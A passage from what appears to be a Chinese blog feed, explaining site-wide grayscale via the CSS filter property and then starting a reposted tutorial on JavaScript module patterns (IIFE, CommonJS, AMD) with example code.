<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">html</span> &#123;</span><br><span class="line">  -webkit-<span class="attribute">filter</span>: <span class="built_in">grayscale</span>(<span class="number">100%</span>);</span><br><span class="line">  -moz-<span class="attribute">filter</span>: <span class="built_in">grayscale</span>(<span class="number">100%</span>);</span><br><span class="line">  -ms-<span class="attribute">filter</span>: <span class="built_in">grayscale</span>(<span class="number">100%</span>);</span><br><span class="line">  -o-<span class="attribute">filter</span>: <span class="built_in">grayscale</span>(<span class="number">100%</span>);</span><br><span class="line">  <span class="attribute">filter</span>: <span class="built_in">grayscale</span>(<span class="number">100%</span>);</span><br><span class="line">  <span class="attribute">filter</span>: progid:DXImageTransform.Microsoft.<span class="built_in">BasicImage</span>(grayscale=<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个实现看起来兼容性会更好一些。</p>
<p>因此我们可以确定，通过一个全局的 CSS 样式就能将整个网站变成灰色效果。</p>
<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>那么这里我们就来详细了解一下这究竟是一个什么样的 CSS 样式。</p>
<p>这个样式名叫做 filter，搜下 MDN 的官方介绍，其链接为：<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/filter">https://developer.mozilla.org/zh-CN/docs/Web/CSS/filter</a>。</p>
<p>官方介绍内容如下：</p>
<blockquote>
<p><strong><code>filter</code></strong> CSS 属性将模糊或颜色偏移等图形效果应用于元素。滤镜通常用于调整图像，背景和边框的渲染。</p>
<p>CSS 标准里包含了一些已实现预定义效果的函数。你也可以参考一个 SVG 滤镜，通过一个 URL 链接到 SVG 滤镜元素 (SVG filter element[1])。</p>
</blockquote>
<p>其实就是一个滤镜的意思。</p>
<p>官方有一个 Demo，可以看下效果，如图所示。</p>
<p>Demo</p>
<p><img src="https://cdn.huatree.top/image-20221203213658626.gif" alt="image-202212032119877"></p>
<p>比如这里通过 filter 样式改变了图片、颜色、模糊、对比度等等信息。</p>
<p>其所有用法示例如下：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* URL to SVG filter */</span></span><br><span class="line"><span class="attribute">filter</span>: <span class="built_in">url</span>(<span class="string">&#x27;filters.svg#filter-id&#x27;</span>);</span><br><span class="line"><span class="comment">/* &lt;filter-function&gt; values */</span></span><br><span class="line"><span class="attribute">filter</span>: <span class="built_in">blur</span>(<span class="number">5px</span>);</span><br><span class="line"><span class="attribute">filter</span>: <span class="built_in">brightness</span>(<span class="number">0.4</span>);</span><br><span class="line"><span class="attribute">filter</span>: <span class="built_in">contrast</span>(<span class="number">200%</span>);</span><br><span class="line"><span class="attribute">filter</span>: <span class="built_in">drop-shadow</span>(<span class="number">16px</span> <span class="number">16px</span> <span class="number">20px</span> blue);</span><br><span class="line"><span class="attribute">filter</span>: <span class="built_in">grayscale</span>(<span class="number">50%</span>);</span><br><span class="line"><span class="attribute">filter</span>: <span class="built_in">hue-rotate</span>(<span class="number">90deg</span>);</span><br><span class="line"><span class="attribute">filter</span>: <span class="built_in">invert</span>(<span class="number">75%</span>);</span><br><span class="line"><span class="attribute">filter</span>: <span class="built_in">opacity</span>(<span class="number">25%</span>);</span><br><span class="line"><span class="attribute">filter</span>: <span class="built_in">saturate</span>(<span class="number">30%</span>);</span><br><span class="line"><span class="attribute">filter</span>: <span class="built_in">sepia</span>(<span class="number">60%</span>);</span><br><span class="line"><span class="comment">/* Multiple filters */</span></span><br><span class="line"><span class="attribute">filter</span>: <span class="built_in">contrast</span>(<span class="number">175%</span>) <span class="built_in">brightness</span>(<span class="number">3%</span>);</span><br><span class="line"><span class="comment">/* Global values */</span></span><br><span class="line"><span class="attribute">filter</span>: inherit;</span><br><span class="line"><span class="attribute">filter</span>: initial;</span><br><span class="line"><span class="attribute">filter</span>: unset;</span><br></pre></td></tr></table></figure>

<p>各个用法介绍大家可以参考官方的文档说明：<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/filter">https://developer.mozilla.org/zh-CN/docs/Web/CSS/filter</a></p>
<p>比如这里如果我们可以使用 blur 设置高斯模糊，用法如下：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="attribute">filter</span>: <span class="built_in">blur</span>(radius);</span><br></pre></td></tr></table></figure>

<p>给图像设置高斯模糊。radius 一值设定高斯函数的标准差，或者是屏幕上以多少像素融在一起，所以值越大越模糊；如果没有设定值，则默认是 0；这个参数可设置绝对像素值，但不接受百分比值。</p>
<p>可以达成这样的效果：</p>
<p><img src="https://cdn.huatree.top/image-20221203212049732.png" alt="image-20221203212049732"></p>
<p>再说回刚才的灰色图像，这里其实就是设置了 grayscale，其用法如下：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="attribute">filter</span>: <span class="built_in">grayscale</span>(percent);</span><br></pre></td></tr></table></figure>

<p>将图像转换为灰度图像。值定义转换的比例。percent 值为 100% 则完全转为灰度图像，值为 0% 图像无变化。值在 0% 到 100% 之间，则是效果的线性乘子。若未设置，值默认是 0。另外除了传递百分比，还可以传递浮点数，效果是一样的。</p>
<p>如：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="attribute">filter</span>: <span class="built_in">grayscale</span>(<span class="number">1</span>)filter: <span class="built_in">grayscale</span>(<span class="number">100%</span>)</span><br></pre></td></tr></table></figure>

<p>都可以将节点转化为 100% 的灰度模式。</p>
<p>所以一切到这里就清楚了，如果我们想要把全站变成灰色，再考虑到各浏览器兼容写法，可以参考下 CSDN 的写法：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.gray</span> &#123;</span><br><span class="line">  -webkit-<span class="attribute">filter</span>: <span class="built_in">grayscale</span>(<span class="number">100%</span>);</span><br><span class="line">  -moz-<span class="attribute">filter</span>: <span class="built_in">grayscale</span>(<span class="number">100%</span>);</span><br><span class="line">  -ms-<span class="attribute">filter</span>: <span class="built_in">grayscale</span>(<span class="number">100%</span>);</span><br><span class="line">  -o-<span class="attribute">filter</span>: <span class="built_in">grayscale</span>(<span class="number">100%</span>);</span><br><span class="line">  <span class="attribute">filter</span>: <span class="built_in">grayscale</span>(<span class="number">100%</span>);</span><br><span class="line">  <span class="attribute">filter</span>: progid:DXImageTransform.Microsoft.<span class="built_in">BasicImage</span>(grayscale=<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这样想要变灰的节点只需要加上 gray 这个 class 就好了，比如加到 html 节点上就可以全站变灰了。</p>
<p>最后呢，看一下浏览器对 filter 这个样式的兼容性怎样，如图所示：</p>
<p><img src="https://cdn.huatree.top/image-20221203212120351.png" alt="image-20221203212120351"></p>
<p>这里我们看到，这里除了 IE，其他的 PC、手机端的浏览器都支持了，Firefox 的 PC、安卓端还单独对 SVG 图像加了支持，可以放心使用。</p>
<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>[1] <a href="https://developer.mozilla.org/en-US/docs/Web/SVG/Element/filter">SVG filter element</a></p>
]]></content>
      <categories>
        <category>经典文章</category>
      </categories>
      <tags>
        <tag>CSS</tag>
      </tags>
  </entry>
  <entry>
    <title>前端模块化的前世今生</title>
    <url>/2022/12/07/20221207-%E5%89%8D%E7%AB%AF%E6%A8%A1%E5%9D%97%E5%8C%96%E7%9A%84%E5%89%8D%E4%B8%96%E4%BB%8A%E7%94%9F/</url>
    <content><![CDATA[<p>随着前端项目越来越庞大，代码复杂性不断增加，对于模块化的需求越来越大。模块化是工程化基础，只有将代码模块化，拆分为合理单元，才具备调度整合的能力。下面就来看看模块化的概念，以及不同模块化方案的使用方式和优缺点。</p>
<p><img src="https://cdn.huatree.top/image-20221218134024614.jpeg" alt="image-20221218134024614"></p>
<span id="more"></span>

<div class="note info"><p>文章转载自CUGGZ | 前端充电宝（微信公众号）</p>
</div>

<h2 id="1-模块概述"><a href="#1-模块概述" class="headerlink" title="1. 模块概述"></a><strong>1. 模块概述</strong></h2><h3 id="（1）概念"><a href="#（1）概念" class="headerlink" title="（1）概念"></a>（1）概念</h3><p>由于代码之间会发生大量交互，如果结构不合理，这些代码就会变得难以维护、难以测试、难以调试。而使用模块化就解决了这些问题，模块化的<strong>特点</strong>如下：</p>
<ul>
<li><strong>可重用性：</strong> 当应用被组织成模块时，可以方便在其他地方重用这些模块，避免编写重复代码，从而加快开发流程；</li>
<li><strong>可读性：</strong> 当应用变得越来越复杂时，如果在一个文件中编写所有功能，代码会变得难以阅读。如果使用模块设计应用，每个功能都分布在各自的模块中，代码就会更加清晰、易读；</li>
<li><strong>可维护性：</strong> 软件的美妙之处在于进化，从长远来看，我们需要不断为应用增加新的功能。当应用被结构化为模块时，可以轻松添加或删除功能。除此之外，修复错误也是软件维护的一部分，使用模块就可以更快速地定位问题。</li>
</ul>
<p>模块化是一种将系统分离成独立功能部分的方法，可以将系统分割成独立的功能部分，严格定义模块接口，模块间具有透明性。通过将代码进行模块化分隔，每个文件彼此独立，开发者更容易开发和维护代码，模块之间又能够互相调用和通信，这就是现代化开发的基本模式。</p>
<h3 id="（2）模式"><a href="#（2）模式" class="headerlink" title="（2）模式"></a>（2）模式</h3><p>JavaScript 模块包含三个部分：</p>
<ul>
<li><strong>导入：</strong> 在使用模块时，需要将所需模块作为依赖项导入。例如，如果想要创建一个 React 组件，就需导入 react 模块。要使用像 Lodash 这样的工具库，就需要安装并导入它作为依赖项；</li>
<li><strong>代码：</strong> 模块具体代码；</li>
<li><strong>导出：</strong> 模块接口，从模块中导出的内容可供导入模块的任何地方使用。</li>
</ul>
<h3 id="（3）类型"><a href="#（3）类型" class="headerlink" title="（3）类型"></a>（3）类型</h3><p>模块化的贯彻执行离不开相应的约定，即规范。这是能够进行模块化工作的重中之重。实现模块化的规范有很多，比如：AMD、RequireJS、CMD、SeaJS、UMD、CommonJS、ES6 Module。除此之外，IIFE（立即执行函数）也是实现模块化的一种方案。</p>
<p>本文将介绍其中的六个：</p>
<ul>
<li><strong>IIFE：</strong> 立即调用函数表达式</li>
<li><strong>AMD：</strong> 异步模块加载机制</li>
<li><strong>CMD：</strong> 通用模块定义</li>
<li><strong>UMD：</strong> 统一模块定义</li>
<li><strong>CommonJS：</strong> Node.js 采用该规范</li>
<li><strong>ES 模块：</strong> JavaScript 内置模块系统</li>
</ul>
<h2 id="2-IIFE"><a href="#2-IIFE" class="headerlink" title="2. IIFE"></a><strong>2. IIFE</strong></h2><p>在 ECMAScript 6 之前，模块并没有被内置到 JavaScript 中，因为 JavaScript 最初是为小型浏览器脚本设计的。这种模块化的缺乏，导致在代码的不同部分使用了共享全局变量。</p>
<p>比如，对于以下代码：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> name = <span class="string">&#x27;JavaScript&#x27;</span></span><br><span class="line"><span class="keyword">var</span> age = <span class="number">20</span></span><br></pre></td></tr></table></figure>

<p>当上面的代码运行时，<code>name</code> 和 <code>age</code> 变量会被添加到全局对象中。因此，应用中的所有 JavaScript 脚本都可以访问全局变量 <code>name</code> 和 <code>age</code>，这就很容易导致代码错误，因为在其他不相关的单元中也可以访问和修改这些全局变量。除此之外，向全局对象添加变量会使全局命名空间变得混乱并增加了命名冲突的机会。</p>
<p>所以，我们就需要一种封装变量和函数的方法，并且只对外公开定义的接口。因此，为了实现模块化并避免使用全局变量，可以使用如下方式来创建模块：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">;(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="comment">// 声明私有变量和函数</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    <span class="comment">// 声明公共变量和函数</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure>

<p>上面的代码就是一个返回对象的闭包，这就是我们常说的 IIFE（Immediately Invoked Function Expression），即立即调用函数表达式。在该函数中，就创建了一个局部范围。这样就避免了使用全局变量（IIFE 是匿名函数），并且代码单元被封装和隔离。</p>
<p>可以这样来使用 IIFE 作为一个模块：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="variable language_">module</span> = (<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> age = <span class="number">20</span></span><br><span class="line">  <span class="keyword">var</span> name = <span class="string">&#x27;JavaScript&#x27;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> fn1 = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(name, age)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> fn2 = <span class="keyword">function</span> (<span class="params">a, b</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(a + b)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    age,</span><br><span class="line">    fn1,</span><br><span class="line">    fn2</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)()</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">age</span> <span class="comment">// 20</span></span><br><span class="line"><span class="variable language_">module</span>.<span class="title function_">fn1</span>() <span class="comment">// JavaScript 20</span></span><br><span class="line"><span class="variable language_">module</span>.<span class="title function_">fn2</span>(<span class="number">128</span>, <span class="number">64</span>) <span class="comment">// 192</span></span><br></pre></td></tr></table></figure>

<p>在这段代码中，<code>module</code> 就是我们定义的一个模块，它里面定义了两个私有变量 <code>age</code> 和 <code>name</code>，同时定义了两个方法 <code>fn1</code> 和 <code>fn2</code>，其中 <code>fn1</code> 中使用 <code>module</code> 中定义的私有变量，<code>fn2</code> 接收外部传入参数。最后，module 向外部暴露了<code>age</code>、<code>fn1</code>、<code>fn2</code>。这样就形成了一个模块。</p>
<p>当试图在 <code>module</code> 外部直接调用<code>fn1</code>时，就会报错：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title function_">fn1</span>() <span class="comment">// Uncaught ReferenceError: fn1 is not defined</span></span><br></pre></td></tr></table></figure>

<p>当试图在 <code>module</code> 外部打印其内部的私有变量<code>name</code>时，得到的结果是 <code>undefined</code>：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">module</span>.<span class="property">name</span> <span class="comment">// undefined</span></span><br></pre></td></tr></table></figure>

<p>上面的 IIFE 的例子是遵循模块模式的，具备其中的三部分，其中 age、name、fn1、fn2 就是模块内部的代码实现，返回的 age、fn1、fn2 就是导出的内容，即接口。调用 <code>module</code> 方法和变量就是导入使用。</p>
<h2 id="3-CommonJS"><a href="#3-CommonJS" class="headerlink" title="3. CommonJS"></a><strong>3. CommonJS</strong></h2><h3 id="（1）概念-1"><a href="#（1）概念-1" class="headerlink" title="（1）概念"></a>（1）概念</h3><h4 id="①-定义"><a href="#①-定义" class="headerlink" title="① 定义"></a>① 定义</h4><p>CommonJS 是社区提出的一种 JavaScript 模块化规范，它是为浏览器之外的 JavaScript 运行环境提供的模块规范，Node.js 就采用了这个规范。</p>
<blockquote>
<p>注意：</p>
<ul>
<li>浏览器不支持使用 CommonJS 规范；</li>
<li>Node.js 不仅支持使用 CommonJS 来实现模块，还支持最新的 ES 模块。</li>
</ul>
</blockquote>
<p>CommonJS 规范加载模块是同步的，只有加载完成才能继续执行后面的操作。不过由于 Node.js 主要运行在服务端，而所需加载的模块文件一般保存在本地硬盘，所以加载比较快，而无需考虑使用异步的方式。</p>
<h4 id="②-语法"><a href="#②-语法" class="headerlink" title="② 语法"></a>② 语法</h4><p>CommonJS 规范规定每个文件就是一个模块，有独立的作用域，对于其他模块不可见，这样就不会污染全局作用域。在 CommonJS 中，可以分别使用 <code>export</code> 和 <code>require</code> 来导出和导入模块。在每个模块内部，都有一个 <code>module</code> 对象，表示当前模块。通过它来导出 API，它有以下属性：</p>
<ul>
<li><code>exports</code>：模块导出值。</li>
<li><code>filename</code>：模块文件名，使用绝对路径；</li>
<li><code>id</code>：模块识别符，通常是使用绝对路径的模块文件名；</li>
<li><code>loaded</code>：布尔值，表示模块是否已经完成加载；</li>
<li><code>parent</code>：对象，表示调用该模块的模块；</li>
<li><code>children</code>：数组，表示该模块要用到的其他模块；</li>
</ul>
<h4 id="③-特点"><a href="#③-特点" class="headerlink" title="③ 特点"></a>③ 特点</h4><p>CommonJS 规范具有以下特点：</p>
<ul>
<li>文件即模块，文件内所有代码都运行在独立的作用域，因此不会污染全局空间；</li>
<li>模块可以被多次引用、加载。第一次被加载时，<strong>会被缓存</strong>，之后都从缓存中直接读取结果。</li>
<li>加载某个模块，就是引入该模块的 <code>module.exports</code> 属性，该属性<strong>输出的是值拷贝</strong>，一旦这个值被输出，模块内再发生变化不会影响到输出的值。</li>
<li>模块加载顺序按照代码引入的顺序。</li>
</ul>
<h4 id="④-优缺点"><a href="#④-优缺点" class="headerlink" title="④ 优缺点"></a>④ 优缺点</h4><p>CommonJS 的优点：</p>
<ul>
<li>使用简单</li>
<li>很多工具系统和包都是使用 CommonJS 构建的；</li>
<li>在 Node.js 中使用，Node.js 是流行的 JavaScript 运行时环境。</li>
</ul>
<p>CommonJS 的缺点</p>
<ul>
<li>可以在 JavaScript 文件中包含一个模块；</li>
<li>如果想在 Web 浏览器中使用它，则需要额外的工具；</li>
<li>本质上是同步的，在某些情况下不适合在 Web 浏览器中使用。</li>
</ul>
<h3 id="（2）使用"><a href="#（2）使用" class="headerlink" title="（2）使用"></a>（2）使用</h3><p>在 CommonJS 中，可以通过 require 函数来导入模块，它会读取、执行 JavaScript 文件，并返回该模块的 exports 对象，该对象只有在模块脚本运行完才会生成。</p>
<h4 id="①-模块导出"><a href="#①-模块导出" class="headerlink" title="① 模块导出"></a>① 模块导出</h4><p>可以通过以下两种方式来导出模块内容：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span>.<span class="property">TestModule</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;exports&#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">exports</span>.<span class="property">TestModule</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;exports&#x27;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>则合两种方式的导出结果是一样的，<code>module.exports</code>和<code>exports</code>的区别可以理解为：<code>exports</code>是<code>module.exports</code>的引用，如果在<code>exports</code>调用之前调用了<code>exports=...</code>，那么就无法再通过<code>exports</code>来导出模块内容，除非通过<code>exports=module.exports</code>重新设置<code>exports</code>的引用指向。</p>
<p>当然，可以先定义函数，再导出：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">testModule</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;exports&#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = testModule</span><br></pre></td></tr></table></figure>

<p>这是仅导出一个函数的情况，使用时就是这样的：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">testModule = <span class="built_in">require</span>(<span class="string">&#x27;./MyModule&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="title function_">testModule</span>()</span><br></pre></td></tr></table></figure>

<p>如果是导出多个函数，就可以这样：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">testModule1</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;exports1&#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">testModule2</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;exports2&#x27;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>导入多个函数并使用：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">;(&#123; testModule1, testModule2 &#125; = <span class="built_in">require</span>(<span class="string">&#x27;./MyModule&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="title function_">testModule1</span>()</span><br><span class="line"><span class="title function_">testModule2</span>()</span><br></pre></td></tr></table></figure>

<h4 id="②-模块导入"><a href="#②-模块导入" class="headerlink" title="② 模块导入"></a>② 模块导入</h4><p>可以通过以下方式来导入模块：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="variable language_">module</span> = <span class="built_in">require</span>(<span class="string">&#x27;./MyModule&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>注意，如果 <code>require</code> 的路径没有后缀，会自动按照<code>.js</code>、<code>.json</code>和<code>.node</code>的顺序进行补齐查找。</p>
<h4 id="③-加载过程"><a href="#③-加载过程" class="headerlink" title="③ 加载过程"></a>③ 加载过程</h4><p>在 CommonJS 中，<code>require</code> 的加载过程如下：</p>
<ol>
<li>优先从缓存中加载；</li>
<li>如果缓存中没有，检查是否是核心模块，如果是直接加载；</li>
<li>如果不是核心模块，检查是否是文件模块，解析路径，根据解析出的路径定位文件，然后执行并加载；</li>
<li>如果以上都不是，沿当前路径向上逐级递归，直到根目录的<code>node_modules</code>目录。</li>
</ol>
<h3 id="（3）示例"><a href="#（3）示例" class="headerlink" title="（3）示例"></a>（3）示例</h3><p>下面来看一个购物车的例子，主要功能是将商品添加到购物车，并计算购物车商品总价格：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// cart.js</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> items = [];</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">addItem</span> (name, price)</span><br><span class="line">    item.<span class="title function_">push</span>(&#123;</span><br><span class="line">    <span class="attr">name</span>: name,</span><br><span class="line">    <span class="attr">price</span>: price</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">exports</span>.<span class="property">total</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> items.<span class="title function_">reduce</span>(<span class="keyword">function</span> (<span class="params">a, b</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> a + b.<span class="property">price</span>;</span><br><span class="line">    &#125;, <span class="number">0</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">exports</span>.<span class="property">addItem</span> = addItem;</span><br></pre></td></tr></table></figure>

<p>这里通过两种方式在 exports 对象上定义了两个方法：addItem 和 total，分别用来添加购物车和计算总价。</p>
<p>下面在控制台测试一下上面定义的模块：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> cart = <span class="built_in">require</span>(<span class="string">&#x27;./cart&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>这里使用相对路径来导入 cart 模块，打印 cart 模块，结果如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">cart <span class="comment">// &#123; total: [Function], addItem: [Function: addItem] &#125;</span></span><br></pre></td></tr></table></figure>

<p>向购物车添加一些商品，并计算当前购物车商品的总价格：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">cart.<span class="title function_">addItem</span>(<span class="string">&#x27;book&#x27;</span>, <span class="number">60</span>)</span><br><span class="line">cart.<span class="title function_">total</span>() <span class="comment">// 60</span></span><br><span class="line"></span><br><span class="line">cart.<span class="title function_">addItem</span>(<span class="string">&#x27;pen&#x27;</span>, <span class="number">6</span>)</span><br><span class="line">cart.<span class="title function_">total</span>() <span class="comment">// 66</span></span><br></pre></td></tr></table></figure>

<p>这就是创建模块的基本方法，我们可以创建一些方法，并且只公开希望其他文件使用的部分代码。该部分成为 API，即应用程序接口。</p>
<p>这里有一个问题，只有一个购物车，即只有一个模块实例。下面来在控制台执行以下代码：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">second_cart = <span class="built_in">require</span>(<span class="string">&#x27;./cart&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>那这时会创建一个新的购物车吗？事实并非如此，打印当前购物车的商品总金额，它仍然是 66：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">second_cart.<span class="title function_">total</span>() <span class="comment">// 66</span></span><br></pre></td></tr></table></figure>

<p>当我们㤇创建多个实例时，就需要再模块内创建一个构造函数，下面来重写 <code>cart.js</code> 文件：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// cart.js</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Cart</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">items</span> = []</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Cart</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">addItem</span> = <span class="keyword">function</span> (<span class="params">name, price</span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">items</span>.<span class="title function_">push</span>(&#123;</span><br><span class="line">    <span class="attr">name</span>: name,</span><br><span class="line">    <span class="attr">price</span>: price</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Cart</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">total</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">items</span>.<span class="title function_">reduce</span>(<span class="keyword">function</span> (<span class="params">a, b</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> a + b.<span class="property">price</span></span><br><span class="line">  &#125;, <span class="number">0</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">export</span> = <span class="title class_">Cart</span></span><br></pre></td></tr></table></figure>

<p>现在，当需要使用此模块时，返回的是 Cart 构造函数，而不是具有 cart 函数作为一个属性的对象。下面来导入这个模块，并创建两个购物车实例：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Cart</span> = <span class="built_in">require</span>(<span class="string">&#x27;./second_cart&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cart1 = <span class="keyword">new</span> <span class="title class_">Cart</span>()</span><br><span class="line">cart2 = <span class="keyword">new</span> <span class="title class_">Cart</span>()</span><br><span class="line"></span><br><span class="line">cart1.<span class="title function_">addItem</span>(<span class="string">&#x27;book&#x27;</span>, <span class="number">50</span>)</span><br><span class="line">cart1.<span class="title function_">total</span>() <span class="comment">// 50</span></span><br><span class="line">cart2.<span class="title function_">total</span>() <span class="comment">// 50</span></span><br></pre></td></tr></table></figure>

<h2 id="4-AMD"><a href="#4-AMD" class="headerlink" title="4. AMD"></a><strong>4. AMD</strong></h2><h3 id="（1）概念-2"><a href="#（1）概念-2" class="headerlink" title="（1）概念"></a>（1）概念</h3><p>CommonJS 的缺点之一是它是同步的，AMD 旨在通过规范中定义的 API 异步加载模块及其依赖项来解决这个问题。AMD 全称为 Asynchronous Module Definition，即<strong>异步模块加载机制</strong>。它规定了如何定义模块，如何对外输出，如何引入依赖。</p>
<p>AMD 规范重要特性就是异步加载。所谓异步加载，就是指同时并发加载所依赖的模块，当所有依赖模块都加载完成之后，再执行当前模块的回调函数。这种加载方式和浏览器环境的性能需求刚好吻合。</p>
<h4 id="①-语法"><a href="#①-语法" class="headerlink" title="① 语法"></a>① 语法</h4><p>AMD 规范定义了一个全局函数 define，通过它就可以定义和引用模块，它有 3 个参数：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title function_">define</span>(id?, dependencies?, factory);</span><br></pre></td></tr></table></figure>

<p>其包含三个参数：</p>
<ul>
<li><code>id</code>：可选，指模块路径。如果没有提供该参数，模块名称默认为模块加载器请求的指定脚本的路径。</li>
<li><code>dependencies</code>：可选，指模块数组。它定义了所依赖的模块。依赖模块必须根据模块的工厂函数优先级执行，并且执行的结果应该按照依赖数组中的位置顺序以参数的形式传入工厂函数中。</li>
<li><code>factory</code>：为模块初始化要执行的函数或对象。如果是函数，那么该函数是单例模式，只会被执行一次；如果是对象，此对象应该为模块的输出值。</li>
</ul>
<p>除此之外，要想使用此模块，就需要使用规范中定义的 require 函数：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">require</span>(dependencies?, callback);</span><br></pre></td></tr></table></figure>

<p>其包含两个参数：</p>
<ul>
<li><code>dependencies</code>：依赖项数组；</li>
<li><code>callback</code>：加载模块时执行的回调函数。</li>
</ul>
<p>有关 AMD API 的更详细说明，可以查看 GitHub 上的 AMD API 规范：<a href="https://github.com/amdjs/amdjs-api/blob/master/AMD.md%E3%80%82">https://github.com/amdjs/amdjs-api/blob/master/AMD.md。</a></p>
<h4 id="②-兼容性"><a href="#②-兼容性" class="headerlink" title="② 兼容性"></a>② 兼容性</h4><p>该规范的浏览器兼容性如下：</p>
<p><img src="https://cdn.huatree.top/image-20221218132523096.png" alt="image-20221218132523096"></p>
<h4 id="③-优缺点"><a href="#③-优缺点" class="headerlink" title="③ 优缺点"></a>③ 优缺点</h4><p>AMD 的<strong>优点</strong>：</p>
<ul>
